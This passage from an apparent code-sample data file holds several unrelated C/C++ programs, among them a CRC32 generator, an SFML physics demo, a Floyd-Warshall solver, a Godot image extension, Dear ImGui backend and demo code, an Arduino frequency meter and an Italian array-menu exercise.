Bail if it is > 252 bytes in size\n    if (binFileSize > 252)\n    {\n        std::cout << \"The input must be 252 Bytes in size at max. Exiting ...\" << std::endl;\n        binFile.close();\n        return 1;\n    }\n\n    // All good, now load the file contents into an array\n    unsigned char binFileData[252] = {0};\n    binFile.read((char *)binFileData, 252);\n    binFile.close();\n\n    // Calculate CRC32 for the 252 bytes of data\n    unsigned char crc[4] = {0};\n    *reinterpret_cast<std::uint32_t*>(crc) = CRC::Calculate(binFileData, 252, CRC::CRC_32_MPEG2());\n\n    // Output the contents of the crc array to a .c file\n    std::ofstream cppFile(binFilePath.replace_filename(\"crc\").replace_extension(\"c\"));\n    cppFile << \"__attribute__((section(\\\".crc\\\"))) unsigned char crc[4] = {\"\n            << \"0x\" << std::setw(2) << std::setfill('0') << std::hex << (unsigned int)crc[0] << \", \"\n            << \"0x\" << std::setw(2) << std::setfill('0') << std::hex << (unsigned int)crc[1] << \", \"\n            << \"0x\" << std::setw(2) << std::setfill('0') << std::hex << (unsigned int)crc[2] << \", \"\n            << \"0x\" << std::setw(2) << std::setfill('0') << std::hex << (unsigned int)crc[3] << \"};\";\n    cppFile.close();\n\n    return 0;\n}",
    "#include <SFML/Graphics.hpp>\n#include <cmath>\n#include <vector>\n#include \"body.hpp\"\n#include \"BigNum.hpp\"\n\nconst float window_width = 1400;\nconst float window_height = 900;\n\nstruct VerletObject {\n\tsf::Vector2f position_current;\n\tsf::Vector2f position_old;\n\tsf::Vector2f acceleration;\n\n\tvoid update(float dt) {\n\t\tapplyConstraints();\n\t\tupdatePosition(dt);\n\t}\n\n\n\tvoid updatePosition(float dt) {\n\t\tsf::Vector2f velocity = position_current - position_old;\n\t\t//save current pos\n\t\tposition_old = position_current;\n\t\t//Verlet Integration\n\t\tposition_current = position_current + velocity + acceleration * dt * dt;\n\t\t//Reset acceleration\n\t\tacceleration = {};\n\t}\n\n\tvoid accelerate(sf::Vector2f acc) {\n\t\tacceleration += acc;\n\t}\n\n\tvoid applyConstraints() {\n\t\tconst sf::Vector2f position{ window_width / 2, window_height / 2 };\n\t\tconst float radius = 200.0f;\n\n\t\tconst sf::Vector2f to_obj = position_current - position;\n\t\tconst float dist = sqrt(to_obj.x * to_obj.x + to_obj.y * to_obj.y);\n\t\tif (dist > radius - 25.f) {\n\t\t\tconst sf::Vector2f n = to_obj / dist;\n\t\t\tposition_current = position + n * (radius - 25.f);\n\t\t}\n\n\t}\n};\n\n\n\nint main() {\n\n\tstring smth = \"60229213188891082391238123123112321609284368924\";\n\tstring smth2 = \"238409238400129768954376982457967345876838\";\n\tstring smth3 = \"5728\";\n\tbignum big(smth);\n\tbignum small(smth2);\n\tbignum mult(smth3);\n\tbig.printNum();\n\tbig.print(2);\n\tcout << big.size() << '\\n';\n\tbig.printNum();\n\tcout << '+' << '\\n';\n\tsmall.printNum();\n\tbig += small;\n\tbig.printNum();\n\tbig = big + 1;\n\tcout << big.check_mistakes() << '\\n';\n\tbig.printNum();\n\tcout << big.number_end << '\\n';\n\tbig = big * mult;\n\tbig.printNum();\n\tbig.printAll();\n\tcout << big.check_mistakes() << '\\n';\n\tbignum test(0);\n\ttest = \"3123e9\";\n\ttest.printNum();\n\n\tfloat circleRadius = 25.f;\n\t//create window\n\tsf::ContextSettings settings;\n\tsettings.antialiasingLevel = 8;\n\tsf::RenderWindow window(sf::VideoMode(window_width, window_height), \"Test Window\", sf::Style::Default, settings);\n\n\n\t//Draw Constraint\n\tsf::CircleShape constraint(200.0f, 1000.f);\n\tconstraint.setFillColor(sf::Color::Transparent);\n\tconstraint.setOutlineThickness(3);\n\tconstraint.setOutlineColor(sf::Color::White);\n\tconstraint.setPosition({window_width / 2 - (200.0f - 25.f), window_height / 2 - (200.0f - 25.f)});\n\n\t//Shapes Verlet Object\n\tVerletObject verletShape;\n\tverletShape.position_current = {window_width/2 - circleRadius, window_height/2 - circleRadius};\n\tverletShape.position_old = verletShape.position_current;\n\tverletShape.acceleration = {};\n\n\t//Draw Shape\n\tsf::CircleShape shape(circleRadius, 1000);\n\tshape.setFillColor(sf::Color::Green);\n\tshape.setOutlineThickness(0);\n\tshape.setOutlineColor(sf::Color::White);\n\tshape.setPosition(verletShape.position_current);\n\n\n\t//Start Clock for delta time\n\tsf::Clock deltaClock;\n\n\t//run while window is open\n\twhile (window.isOpen()) {\n\t\n\t\tsf::Time dt = deltaClock.restart();\n\t\t//check all triggered events\n\t\tsf::Event event;\n\t\twhile (window.pollEvent(event))\n\t\t{\n\t\t\tif (event.type == sf::Event::Closed)\n\t\t\t\twindow.close();\n\t\t}\n\n\t\t//clear window with black color\n\t\twindow.clear(sf::Color::Black);\n\t\t\n\t\tverletShape.accelerate({0.f, 1000.0f});\n\t\tverletShape.update(dt.asSeconds());\n\t\tshape.setPosition(verletShape.position_current);\n\t\t\n\t\t//draw everything with window.draw()\n\t\twindow.draw(shape);\n\t\twindow.draw(constraint);\n\n\t\t//end frame\n\t\twindow.display();\n\t}\n\t\n\n\treturn 0;\n}",
    "#include <bits/stdc++.h>\nusing namespace std;\n#define INF 1000000000 // A large value to represent infinity\n\nint main() {\n    ios_base::sync_with_stdio(0);\n    cin.tie(0);\n    cout.tie(0);\n\n    int n;\n    cin >> n;\n    \n    vector<vector<int>> adj(n, vector<int>(n));\n\n    for (int i = 0; i < n; i++) {\n        for (int j = 0; j < n; j++) {\n            int x;\n            cin >> x;\n            if (x == -1) {\n                adj[i][j] = INF;\n            } else {\n                adj[i][j] = x; \n            }\n        }\n    }\n\n    for (int k = 0; k < n; k++) {\n        for (int i = 0; i < n; i++) {\n            for (int j = 0; j < n; j++) {\n                if (adj[i][k] < INF && adj[k][j] < INF) { \n                    adj[i][j] = min(adj[i][j], adj[i][k] + adj[k][j]);\n                }\n            }\n        }\n    }\n\n    int maxShortestDistance = 0;\n    for (int i = 0; i < n; i++) {\n        for (int j = 0; j < n; j++) {\n            if (i != j && adj[i][j] < INF) {\n                maxShortestDistance = max(maxShortestDistance, adj[i][j]);\n            }\n        }\n    }\n\n    cout << maxShortestDistance << endl;\n    return 0;\n}\n",
    "#include \"ImageExtension.h\"\n#include <godot_cpp/core/class_db.hpp>\n#include <godot_cpp/godot.hpp>\n#include <godot_cpp/variant/utility_functions.hpp>\n#include <godot_cpp/variant/variant.hpp>\n#include <godot_cpp/core/math.hpp>\n#include <godot_cpp/variant/packed_byte_array.hpp>\n#include <godot_cpp/classes/curve.hpp>\n\nusing namespace godot;\n\n\nPackedVector2Array ImageExtension::brush_to_image_with_pos(Ref<Image> image, Ref<Image> brush_image, Ref<Curve> resistance,float strength,float reduce_factor = 0.0) {\n    PackedVector2Array change_pixel_array;\n    PackedByteArray image_data = image->get_data();\n    uint8_t* image_data_ptr = image_data.ptrw();\n    PackedByteArray brush_image_data = brush_image->get_data();\n    uint8_t* brush_data_ptr = brush_image_data.ptrw();\n    int size = image_data.size();\n    bool modif = false;\n    for (int i = 0; i < size; ++i) {\n        int current_value = image_data[i];\n        if (current_value == 0){\n            continue;\n        }\n        if (brush_data_ptr[i] == 0){\n            continue;\n        }\n        int dig_value = (((brush_data_ptr[i]*5)*strength)/(1.0+((resistance->sample(1.0-(current_value/255.0)))*255)));\n        if (dig_value == 0){\n            brush_data_ptr[i] *= reduce_factor;\n            modif = true;\n            continue;\n        }\n        int new_value = MAX(current_value - dig_value,0);\n        image_data_ptr[i] = new_value;\n        change_pixel_array.append(Vector2(i,current_value-new_value));\n        brush_data_ptr[i] *= reduce_factor;\n        modif = true;\n    }\n    if (modif){\n        image->set_data(image->get_width(),image->get_height(),false,image->get_format(),image_data);\n    }\n    brush_image->set_data(brush_image->get_width(),brush_image->get_height(),false,brush_image->get_format(),brush_image_data);\n    return change_pixel_array;\n}\n\n\nPackedVector2Array ImageExtension::get_image_border(Ref<Image> image,int resize_factor) {\n    PackedVector2Array image_border;\n    PackedByteArray image_data = image->get_data();\n    uint8_t* image_data_ptr = image_data.ptrw();\n    \n    int width = image->get_width();\n    int height = image->get_height();\n    int pitch = width * 2;\n\n    for (int y = 0; y < height; ++y) {\n        for (int x = 0; x < width; ++x) {\n            int index = (y * pitch) + (x * 2); \n            uint8_t alpha = image_data_ptr[index + 1]; \n            if (alpha == 0) {\n                continue;\n            }\n            if (x > 0 && x < width - 1 && y > 0 && y < height - 1) {\n                uint8_t alpha_up = image_data_ptr[((y + 1) * pitch) + (x * 2) + 1];\n                uint8_t alpha_down = image_data_ptr[((y - 1) * pitch) + (x * 2) + 1];\n                uint8_t alpha_right = image_data_ptr[(y * pitch) + ((x + 1) * 2) + 1];\n                uint8_t alpha_left = image_data_ptr[(y * pitch) + ((x - 1) * 2) + 1];\n                if (alpha_up > 0 && alpha_down > 0 && alpha_right > 0 && alpha_left > 0) {\n                    continue;\n                }\n            }\n            image_border.append(Vector2(x, y)*resize_factor);\n        }\n    }\n    return image_border;\n}\n\n\nvoid ImageExtension::add_brush_to_image(Ref<Image> image, Ref<Image> brush_image,float amount) {\n    PackedByteArray image_data = image->get_data();\n    uint8_t* image_data_ptr = image_data.ptrw();\n    PackedByteArray brush_image_data = brush_image->get_data();\n    uint8_t* brush_data_ptr = brush_image_data.ptrw();\n    int size = image_data.size();\n    bool modif = false;\n    for (int i = 0; i < size; ++i) {\n        int current_value = image_data[i];\n        if (current_value >= 255){\n            continue;\n        }\n        int add_value = brush_data_ptr[i]*amount;\n        if (add_value == 0){\n            continue;\n        }\n        image_data_ptr[i] = MIN(image_data_ptr[i]+add_value,255);\n        modif = true;\n    }\n    if (modif){\n        image->set_data(image->get_width(),image->get_height(),false,image->get_format(),image_data);\n    }\n}\n\nvoid ImageExtension::convert_image_to_occluder(Ref<Image> image) {\n    PackedByteArray image_data = image->get_data();\n    int size = image_data.size();\n    for (int i = 0; i < size/4; ++i) {\n        int id = (i*4)+3;\n        int alpha = image_data[id];\n        if (alpha == 0){\n            image_data[id-1] = 0;\n            image_data[id-2] = 0;\n            image_data[id-3] = 0;\n            image_data[id] = 255;\n        }else{\n            image_data[id-1] = 255;\n            image_data[id-2] = 255;\n            image_data[id-3] = 255;\n            image_data[id] = 255;\n        }\n    }\n    image->set_data(image->get_width(),image->get_height(),false,image->get_format(),image_data);\n}\n\nfloat ImageExtension::occluder(Ref<Image> image, Ref<Image> brush_image) {\n    PackedByteArray image_data = image->get_data();\n    uint8_t* image_data_ptr = image_data.ptrw();\n    PackedByteArray brush_image_data = brush_image->get_data();\n    uint8_t* brush_data_ptr = brush_image_data.ptrw();\n    int size = image_data.size();\n    float pixel_count = 0;\n    for (int i",
    "// dear imgui: Renderer Backend for DirectX11\n// This needs to be used along with a Platform Backend (e.g. Win32)\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'ID3D11ShaderResourceView*' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Support for large meshes (64k+ vertices) with 16-bit indices.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-05-19: DirectX11: Replaced direct access to ImDrawCmd::TextureId with a call to ImDrawCmd::GetTexID(). (will become a requirement)\n//  2021-02-18: DirectX11: Change blending equation to preserve alpha in output buffer.\n//  2019-08-01: DirectX11: Fixed code querying the Geometry Shader state (would generally error with Debug layer enabled).\n//  2019-07-21: DirectX11: Backup, clear and restore Geometry Shader is any is bound when calling ImGui_ImplDX10_RenderDrawData. Clearing Hull/Domain/Compute shaders without backup/restore.\n//  2019-05-29: DirectX11: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2019-04-30: DirectX11: Added support for special ImDrawCallback_ResetRenderState callback to reset render state.\n//  2018-12-03: Misc: Added #pragma comment statement to automatically link with d3dcompiler.lib when using D3DCompile().\n//  2018-11-30: Misc: Setting up io.BackendRendererName so it can be displayed in the About Window.\n//  2018-08-01: DirectX11: Querying for IDXGIFactory instead of IDXGIFactory1 to increase compatibility.\n//  2018-07-13: DirectX11: Fixed unreleased resources in Init and Shutdown functions.\n//  2018-06-08: Misc: Extracted imgui_impl_dx11.cpp/.h away from the old combined DX11+Win32 example.\n//  2018-06-08: DirectX11: Use draw_data->DisplayPos and draw_data->DisplaySize to setup projection matrix and clipping rectangle.\n//  2018-02-16: Misc: Obsoleted the io.RenderDrawListsFn callback and exposed ImGui_ImplDX11_RenderDrawData() in the .h file so you can call it yourself.\n//  2018-02-06: Misc: Removed call to ImGui::Shutdown() which is not available from 1.60 WIP, user needs to call CreateContext/DestroyContext themselves.\n//  2016-05-07: DirectX11: Disabling depth-write.\n\n#include \"imgui.h\"\n#include \"imgui_impl_dx11.h\"\n\n// DirectX\n#include <stdio.h>\n#include <d3d11.h>\n#include <d3dcompiler.h>\n#ifdef _MSC_VER\n#pragma comment(lib, \"d3dcompiler\") // Automatically link with d3dcompiler.lib as we are using D3DCompile() below.\n#endif\n\n// DirectX11 data\nstruct ImGui_ImplDX11_Data\n{\n    ID3D11Device*               pd3dDevice;\n    ID3D11DeviceContext*        pd3dDeviceContext;\n    IDXGIFactory*               pFactory;\n    ID3D11Buffer*               pVB;\n    ID3D11Buffer*               pIB;\n    ID3D11VertexShader*         pVertexShader;\n    ID3D11InputLayout*          pInputLayout;\n    ID3D11Buffer*               pVertexConstantBuffer;\n    ID3D11PixelShader*          pPixelShader;\n    ID3D11SamplerState*         pFontSampler;\n    ID3D11ShaderResourceView*   pFontTextureView;\n    ID3D11RasterizerState*      pRasterizerState;\n    ID3D11BlendState*           pBlendState;\n    ID3D11DepthStencilState*    pDepthStencilState;\n    int                         VertexBufferSize;\n    int                         IndexBufferSize;\n\n    ImGui_ImplDX11_Data()       { memset(this, 0, sizeof(*this)); VertexBufferSize = 5000; IndexBufferSize = 10000; }\n};\n\nstruct VERTEX_CONSTANT_BUFFER\n{\n    float   mvp[4][4];\n};\n\n// Backend data stored in io.BackendRendererUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\nstatic ImGui_ImplDX11_Data* ImGui_ImplDX11_GetBackendData()\n{\n    return ImGui::GetCurrentContext() ? (ImGui_ImplDX11_Data*)ImGui::GetIO().BackendRendererUserData : NULL;\n}\n\n// Functions\nstatic void ImGui_ImplDX11_SetupRenderState(ImDrawData* draw_data, ID3D11DeviceContext* ctx)\n{\n    ImGui_ImplDX11_Data* bd = ImGui_ImplDX11_GetBackendData();\n\n    // Setup viewport\n    D3D11_VIEWPORT vp;\n    memset(&vp, 0, sizeof(D3D11_VIEWPORT));\n    vp.Width = draw_data->DisplaySize.x;\n    vp.Height = draw_data->DisplaySize.y;\n    vp.MinDepth = 0.0f;\n    vp.MaxDepth = 1.0f;\n    vp.TopLeftX = vp.TopLeftY = 0;\n    ctx->RSSetViewports(1, &vp);\n\n    // Setup shader and vertex buffers\n    unsigned in",
    "#include <Adafruit_LiquidCrystal.h>\n\n// Asignaci\u00f3n de pines GPIO\nconst int boton_1 = 3;      // Pin del primer bot\u00f3n\nconst int boton_2 = 2;      // Pin del segundo bot\u00f3n\nconst int generador = A0;   // Pin de entrada anal\u00f3gica para la se\u00f1al generada\n\n// Variables de control\nint estado_boton_1 = 0;     // Variable que guarda el estado del bot\u00f3n 1\nint estado_boton_2 = 0;     // Variable que guarda el estado del bot\u00f3n 2\nint valorActual = 0; \t    // Almacena el valor le\u00eddo en el pin A0 (se\u00f1al anal\u00f3gica)\n\n// Banderas de control\nbool bandera_boton_1 = false;  // Indica si el bot\u00f3n 1 ha sido presionado\nbool bandera_boton_2 = false;  // Indica si el bot\u00f3n 2 ha sido presionado\nbool captura_nueva = false;    // Indica si se realiz\u00f3 una nueva captura de datos\nbool detecto_fre = false;      // Indica si se ha detectado una frecuencia\n\n// Variables para la amplitud\nfloat amplitud = 0.0;  \t\t  // Almacena la amplitud de la se\u00f1al\nfloat valorMinimo = 5000.0;   // Valor inicial alto para calibrar la se\u00f1al m\u00ednima\nfloat valorMaximo = -5000.0;  // Valor inicial bajo para calibrar la se\u00f1al m\u00e1xima\n\n// Variables de tiempo\nunsigned long tiempoInicio = 0;  // Almacena el tiempo del primer cruce por cero\nunsigned long tiempoFin = 0;     // Almacena el tiempo del segundo cruce por cero\nunsigned long periodo = 0;       // Almacena el per\u00edodo de la se\u00f1al en microsegundos\nint tiempoCalibracion = 1000;    // Tiempo de calibraci\u00f3n (en milisegundos)\nunsigned long t_final = 0;             // Variable auxiliar para gestionar el tiempo actual\n\n// Variables para la frecuencia\nint valorMedio = 0;              // Valor medio de la se\u00f1al para detectar cruces de cero\nfloat frecuencia = 0;            // Frecuencia calculada en Hz\nbool cruceDetectado = false;     // Indica si se ha detectado un cruce ascendente de la se\u00f1al\nint histeresis = 5;              // Umbral de hist\u00e9resis para evitar falsos cruces de se\u00f1al\n\n// Variables para memoria din\u00e1mica\nint* arreglo = nullptr;      // Puntero para el arreglo din\u00e1mico de almacenamiento de valores\nint contador = 0;            // Contador de los valores almacenados en el arreglo\nint capacidad = 10;          // Capacidad inicial del arreglo (en elementos)\nint incremento = 10;         // Cantidad de elementos que se agregar\u00e1n cuando se expanda el arreglo\nint maximo_elementos = 250;  // M\u00e1ximo n\u00famero de elementos permitidos en el arreglo\n\nAdafruit_LiquidCrystal lcd_1(0);  // Inicializa el objeto LCD con el puerto I2C 0\n\nvoid setup() {\n  \n  // Configuraci\u00f3n de los pines de entrada\n  pinMode(boton_1, INPUT);  \t// Configura el bot\u00f3n 1 como entrada\n  pinMode(boton_2, INPUT);   \t// Configura el bot\u00f3n 2 como entrada\n  pinMode(generador, INPUT); \t// Configura el pin del generador como entrada anal\u00f3gica\n  \n  // Configuraci\u00f3n del LCD\n  lcd_1.begin(16, 2);  \t\t\t// Inicia el LCD con 16 columnas y 2 filas  \n  Serial.begin(115200);  \t\t// Inicia la comunicaci\u00f3n serial a 115200 baudios\n  \n  // Mensaje inicial en la pantalla LCD\n  lcd_1.print(\"Desafio_1\");\n  \n  // Inicializa el arreglo din\u00e1mico con la capacidad inicial definida\n  arreglo = new int[capacidad];\n}\n\n// Funci\u00f3n para detectar la frecuencia de la se\u00f1al\nvoid detectarFrecuencia() {\n  valorActual = analogRead(generador);  // Lee el valor anal\u00f3gico de la se\u00f1al\n  \n  // Detectar cruce ascendente con hist\u00e9resis para evitar falsos cruces\n  if (valorActual >= valorMedio + histeresis && !cruceDetectado) {\n    if (tiempoInicio == 0) {\n      // Si es el primer cruce, almacena el tiempo\n      tiempoInicio = micros();\n    } else {\n      // Si es el segundo cruce, calcula el per\u00edodo\n      tiempoFin = micros();\n      periodo = tiempoFin - tiempoInicio;\n      frecuencia = 1000000.0 / periodo;  // Calcula la frecuencia en Hz\n      tiempoInicio = tiempoFin;          // Reinicia el tiempo para el siguiente ciclo\n      detecto_fre = true;                // Marca que se ha detectado la frecuencia\n    }\n    cruceDetectado = true;  // Marca que se ha detectado un cruce ascendente\n  }\n  \n  // Permite detectar el siguiente cruce cuando la se\u00f1al cae por debajo del valor medio menos la hist\u00e9resis\n  if (valorActual < valorMedio - histeresis) {\n    cruceDetectado = false;\n  }\n}\n\n// Funci\u00f3n para almacenar el valor en un arreglo din\u00e1mico, expandi\u00e9ndolo si es necesario\nvoid almacenarValor() {\n  valorActual = analogRead(generador);  // Lee el valor anal\u00f3gico de la se\u00f1al\n  \n  // Verifica si hay espacio en el arreglo y si se permite almacenar m\u00e1s elementos\n  if (contador < maximo_elementos) {\n    if (contador >= capacidad) {\n      // Expande el arreglo din\u00e1mico si se ha alcanzado la capacidad actual\n      capacidad += incremento;\n      int* temp = new int[capacidad]; // Crea un nuevo arreglo con mayor capacidad\n      for (int i = 0; i < contador; i++) {\n        temp[i] = arreglo[i]; // Copia los valores existentes al nuevo arreglo\n      }\n      delete[] arreglo;       // Libera la memoria del arreglo anterior\n      arreglo = temp;         // Actualiza el puntero al nuevo arreglo\n    }\n    *(arreglo + con",
    "/*****************************************************************************/\n/*                                                                           */\n/*      888888888        ,o,                          / 888                  */\n/*         888    88o88o  \"    o8888o  88o8888o o88888o 888  o88888o         */\n/*         888    888    888       88b 888  888 888 888 888 d888  88b        */\n/*         888    888    888  o88^o888 888  888 \"88888\" 888 8888oo888        */\n/*         888    888    888 C888  888 888  888  /      888 q888             */\n/*         888    888    888  \"88o^888 888  888 Cb      888  \"88oooo\"        */\n/*                                              \"8oo8D                       */\n/*                                                                           */\n/*  A Two-Dimensional Quality Mesh Generator and Delaunay Triangulator.      */\n/*  (triangle.c)                                                             */\n/*                                                                           */\n/*  Version 1.6                                                              */\n/*  July 28, 2005                                                            */\n/*                                                                           */\n/*  Copyright 1993, 1995, 1997, 1998, 2002, 2005                             */\n/*  Jonathan Richard Shewchuk                                                */\n/*  2360 Woolsey #H                                                          */\n/*  Berkeley, California  94705-1927                                         */\n/*  jrs@cs.berkeley.edu                                                      */\n/*                                                                           */\n/*  Modified by Andreas Geiger, 2011                                         */\n/*                                                                           */\n/*  This program may be freely redistributed under the condition that the    */\n/*    copyright notices (including this entire header and the copyright      */\n/*    notice printed when the `-h' switch is selected) are not removed, and  */\n/*    no compensation is received.  Private, research, and institutional     */\n/*    use is free.  You may distribute modified versions of this code UNDER  */\n/*    THE CONDITION THAT THIS CODE AND ANY MODIFICATIONS MADE TO IT IN THE   */\n/*    SAME FILE REMAIN UNDER COPYRIGHT OF THE ORIGINAL AUTHOR, BOTH SOURCE   */\n/*    AND OBJECT CODE ARE MADE FREELY AVAILABLE WITHOUT CHARGE, AND CLEAR    */\n/*    NOTICE IS GIVEN OF THE MODIFICATIONS.  Distribution of this code as    */\n/*    part of a commercial system is permissible ONLY BY DIRECT ARRANGEMENT  */\n/*    WITH THE AUTHOR.  (If you are not directly supplying this code to a    */\n/*    customer, and you are instead telling them how they can obtain it for  */\n/*    free, then you are not required to make any arrangement with me.)      */\n/*                                                                           */\n/*  Hypertext instructions for Triangle are available on the Web at          */\n/*                                                                           */\n/*      http://www.cs.cmu.edu/~quake/triangle.html                           */\n/*                                                                           */\n/*  Disclaimer:  Neither I nor Carnegie Mellon warrant this code in any way  */\n/*    whatsoever.  This code is provided \"as-is\".  Use at your own risk.     */\n/*                                                                           */\n/*  Some of the references listed below are marked with an asterisk.  [*]    */\n/*    These references are available for downloading from the Web page       */\n/*                                                                           */\n/*      http://www.cs.cmu.edu/~quake/triangle.research.html                  */\n/*                                                                           */\n/*  Three papers discussing aspects of Triangle are available.  A short      */\n/*    overview appears in \"Triangle:  Engineering a 2D Quality Mesh          */\n/*    Generator and Delaunay Triangulator,\" in Applied Computational         */\n/*    Geometry:  Towards Geometric Engineering, Ming C. Lin and Dinesh       */\n/*    Manocha, editors, Lecture Notes in Computer Science volume 1148,       */\n/*    pages 203-222, Springer-Verlag, Berlin, May 1996 (from the First ACM   */\n/*    Workshop on Applied Computational Geometry).  [*]                      */\n/*                                                                           */\n/*    The algorithms are discussed in the greatest detail in \"Delaunay       */\n/*    Refinement Algorithms for Triangular Mesh Generation,\" Computational   */\n/*    Geometry:  Theory and Applications 22(1-3):21-74, May 2002.  [*]       */\n/*                                                                           */\n/*    More detail about the data structu",
    "#include<iostream>\r\n#include<cctype>\r\n\r\nusing namespace std;\r\n\r\n//Prototipi\r\nint menu();\r\nbool caricamento(int numeri[],int &dim);\r\nvoid copy(int numeri[],int copy_numeri[],int dim);\r\nbool ordina(int copy_numeri[],int dim);\r\nvoid ordinamento_crescente(int vettore[],int dim);\r\nvoid stampa(int vettore[],int dim);\r\nvoid max_min(int numeri[],int dim);\r\nfloat media(int vettore[],int dim);\r\nint ricerca_parziale(int vettore[],int dim,int x,bool &c);\r\nint ricerca_totale(int vettore[],int dim,int x,bool &c);\r\n\r\n//Dichiarazione costanti\r\nconst int e=100;\r\n\r\n//Caratteri ANSI\r\n#define RESET   \"\\033[0m\"\r\n#define RED     \"\\033[31m\"       \r\n#define GREEN   \"\\033[32m\"       \r\n#define YELLOW  \"\\033[33m\"       \r\n\r\nint main(){\r\n\r\n    int numeri[e],copy_numeri[e],dim,s;\r\n    bool c,c1,c2,c3;\r\n\r\n    c=c1=c2=c3=false;\r\n\r\n    do{\r\n        system(\"cls\");\r\n        s=menu();\r\n        switch(s){\r\n            case 1:{\r\n                c=caricamento(numeri,dim);\r\n                copy(numeri,copy_numeri,dim);\r\n                cout<<GREEN<<\"Caricamento completato!\"<<RESET<<endl;\r\n                break;\r\n            }\r\n\r\n            case 2:{\r\n                if(c==false){\r\n                    cout<<RED<<\"ERRORE: caricare prima il vettore!\"<<RESET<<endl;\r\n                    break;\r\n                }\r\n\r\n                c1=ordina(copy_numeri,dim);\r\n                break;\r\n            }\r\n\r\n            case 3:{\r\n                if(c==false){\r\n                    cout<<RED<<\"ERRORE: caricare prima il vettore!\"<<RESET<<endl;\r\n                    break;\r\n                }\r\n                max_min(numeri,dim);\r\n                break;\r\n            }\r\n\r\n            case 4:{\r\n                if(c==false){\r\n                    cout<<RED<<\"ERRORE: caricare prima il vettore!\"<<RESET<<endl;\r\n                    break;\r\n                }\r\n                cout<<GREEN<<\"La media e': \"<<media(numeri,dim)<<RESET<<endl;\r\n                break;\r\n            }\r\n\r\n            case 5:{\r\n                int i=0,x=0;\r\n                if(c==false){\r\n                    cout<<RED<<\"ERRORE: caricare prima il vettore!\"<<RESET<<endl;\r\n                    break;\r\n                }\r\n                cout<<\"Inserisci numero da cercare: \";\r\n                cin>>x;\r\n                ricerca_parziale(numeri,dim,x,c2);\r\n\r\n                if(c2==false){\r\n                    cout<<RED<<\"ERRORE: numero non trovato!\"<<RESET<<endl;\r\n                }\r\n                else{\r\n                    cout<<GREEN<<\"Numero trovato!\"<<RESET<<endl;\r\n                    cout<<\"Posizione: \"<<x+1<<endl;\r\n                }\r\n                break;\r\n            }\r\n\r\n            case 6:{\r\n                int i=0,x=0;\r\n\r\n                if(c==false){\r\n                    cout<<RED<<\"ERRORE: caricare prima il vettore!\"<<RESET<<endl;\r\n                    break;\r\n                }\r\n                cout<<\"Inserisci numero da cercare: \";\r\n                cin>>x;\r\n                i=ricerca_totale(numeri,dim,x,c3);\r\n\r\n                if(c3==false){\r\n                    cout<<RED<<\"ERRORE: numero non trovato!\"<<RESET<<endl;\r\n                }\r\n                else{\r\n                    cout<<GREEN<<\"Numero trovato!\"<<RESET<<endl;\r\n                    cout<<\"Posizione: \"<<x+1<<endl;\r\n                    cout<<\"Numero comparso \"<<i<<\" volte\"<<endl;\r\n                }\r\n                break;\r\n            }\r\n\r\n            case 7:{\r\n                if(c==false){\r\n                    cout<<RED<<\"ERRORE: caricare prima il vettore!\"<<RESET<<endl;\r\n                    break;\r\n                }\r\n                stampa(numeri,dim);\r\n                break;\r\n            }\r\n\r\n            case 0:{\r\n                cout<<GREEN<<\"Arrivederci!\"<<RESET<<endl;\r\n                break;\r\n            }\r\n\r\n            default:{\r\n                cout<<RED<<\"ERRORE: scelta non valida!\"<<RESET<<endl;\r\n                break;\r\n            }\r\n\r\n        }\r\n\r\n    }while(s!=0);\r\n    system(\"pause\");\r\n    return 0;\r\n}\r\n\r\n//Prototipi\r\nint menu(){\r\n    int s;\r\n\r\n    cout<<\"\\t-----MENU-----\"<<endl;\r\n    cout<<\"1. Caricamento\"<<endl;\r\n    cout<<\"2. Ordina vettore\"<<endl;\r\n    cout<<\"3. Trova Max e Min\"<<endl;\r\n    cout<<\"4. Media\"<<endl;\r\n    cout<<\"5. Ricerca Parziale\"<<endl;\r\n    cout<<\"6. Ricerca Totale\"<<endl;\r\n    cout<<\"7. Stampa vettore\"<<endl;\r\n    cout<<\"0. Esci\"<<endl;\r\n\r\n    cout<<\"\\nInserisci scelta: \";\r\n    cin>>s;\r\n    return s;\r\n}\r\n\r\nbool caricamento(int numeri[],int &dim){\r\n    int i=0;\r\n    char ris;\r\n\r\n    do{\r\n        cout<<\"\\nInserisci numero: \";\r\n        cin>>numeri[i];\r\n\r\n        i++;\r\n\r\n        cout<<\"Vuoi continuare? [s/n] \";\r\n        cin>>ris;\r\n\r\n        ris=tolower(ris);\r\n    }while(ris!='n');\r\n\r\n    dim=i++;\r\n    return true;\r\n}\r\n\r\nvoid copy(int numeri[],int copy_numeri[],int dim){\r\n    for(int i=0;i<dim;i++){\r\n        copy_numeri[i]=numeri[i];\r\n    }\r\n}\r\n\r\nbool ordina(int copy_numeri[],int dim){\r\n\r\n    ordinamento_crescente(copy_numeri,dim);\r\n\r\n    cout<<GREEN<<\"Vettore ordinato in ordine crescente:\"<<RESET<<endl;\r\n    s",
    "// dear imgui, v1.90.3\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.com/faq\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Need help integrating Dear ImGui in your codebase?\n//   - Read Getting Started https://github.com/ocornut/imgui/wiki/Getting-Started\n//   - Read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n//---------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n//---------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your 